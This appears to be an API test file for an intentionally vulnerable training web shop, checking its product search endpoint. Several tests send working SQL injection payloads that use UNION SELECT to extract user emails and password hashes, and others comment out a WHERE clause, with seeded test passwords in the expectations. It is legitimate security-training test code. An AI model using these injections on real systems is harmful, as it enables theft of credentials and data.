const frisby = require('frisby')
const insecurity = require('../../lib/insecurity')
const config = require('config')

const christmasProduct = config.get('products').filter(({ useForChristmasSpecialChallenge }) => useForChristmasSpecialChallenge)[0]

const API_URL = 'http://localhost:3000/api'
const REST_URL = 'http://localhost:3000/rest'

describe('/rest/product/search', () => {
  it('GET product search with no matches returns no products', () => {
    return frisby.get(REST_URL + '/product/search?q=nomatcheswhatsoever')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0)
      })
  })

  it('GET product search with one match returns found product', () => {
    return frisby.get(REST_URL + '/product/search?q=o-saft')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1)
      })
  })

  it('GET product search fails with error message that exposes ins SQL Injection vulnerability', () => {
    return frisby.get(REST_URL + '/product/search?q=\';')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;;&quot;: syntax error')
  })

  it('GET product search SQL Injection fails from two missing closing parenthesis', () => {
    return frisby.get(REST_URL + '/product/search?q=\' union select null,id,email,password,null,null,null from users--')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;union&quot;: syntax error')
  })

  it('GET product search SQL Injection fails from one missing closing parenthesis', () => {
    return frisby.get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;union&quot;: syntax error')
  })

  it('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', () => {
    return frisby.get(REST_URL + '/product/search?q=\')) union select * from users--')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
      .expect('bodyContains', 'SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns', () => {})
  })

  it('GET product search can create UNION SELECT with Users table and fixed columns', () => {
    return frisby.get(REST_URL + '/product/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\' from users--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        id: '1',
        name: '2',
        description: '3',
        price: '4',
        image: '5',
        createdAt: '6',
        updatedAt: '7'
      })
  })

  it('GET product search can create UNION SELECT with Users table and required columns', () => {
    return frisby.get(REST_URL + '/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        name: 1,
        description: 'admin@' + config.get('application.domain'),
        price: insecurity.hash('admin123')
      })
      .expect('json', 'data.?', {
        name: 2,
        description: 'jim@' + config.get('application.domain'),
        price: insecurity.hash('ncc-1701')
      })
      .expect('json', 'data.?', {
        name: 3,
        description: 'bender@' + config.get('application.domain')
        // no check for Bender's password as it might have already been changed by the CSRF test
      })
      .expect('json', 'data.?', {
        name: 4,
        description: 'bjoern.kimminich@googlemail.com',
        price: insecurity.hash('YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==')
      })
      .expect('json', 'data.?', {
        name: 5,
        description: 'ciso@' + config.get('application.domain'),
        price: insecurity.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
      })
      .expect('json', 'data.?', {
        name: 6,
        description: 'support@' + config.get('application.domain'),
        price: insecurity.hash('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
      })
  })

  it('GET product search cannot select logically deleted christmas special by default', () => {
    return frisby.get(REST_URL + '/product/search?q=seasonal%20special%20offer')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0)
      })
  })

  it('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', () => {
    return frisby.get(REST_URL + '/product/search?q=seasonal%20special%20offer\'))--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0)
      })
  })

  it('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', () => {
    return frisby.get(REST_URL + '/product/search?q=' + christmasProduct.name + '\'))--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1)
        expect(json.data[0].name).toBe(christmasProduct.name)
      })
  })

  it('GET product search with empty search parameter returns all products', () => {
    return frisby.get(API_URL + '/Products')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        const products = json.data
        return frisby.get(REST_URL + '/product/search?q=')
          .expect('status', 200)
          .expect('header', 'content-type', /application\/json/)
          .then(({ json }) => {
            expect(json.data.length).toBe(products.length)
          })
      })
  })

  it('GET product search without search parameter returns all products', () => {
    return frisby.get(API_URL + '/Products')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(({ json }) => {
        const products = json.data
        return frisby.get(REST_URL + '/product/search')
          .expect('status', 200)
          .expect('header', 'content-type', /application\/json/)
          .then(({ json }) => {
            expect(json.data.length).toBe(products.length)
          })
      })
  })
})
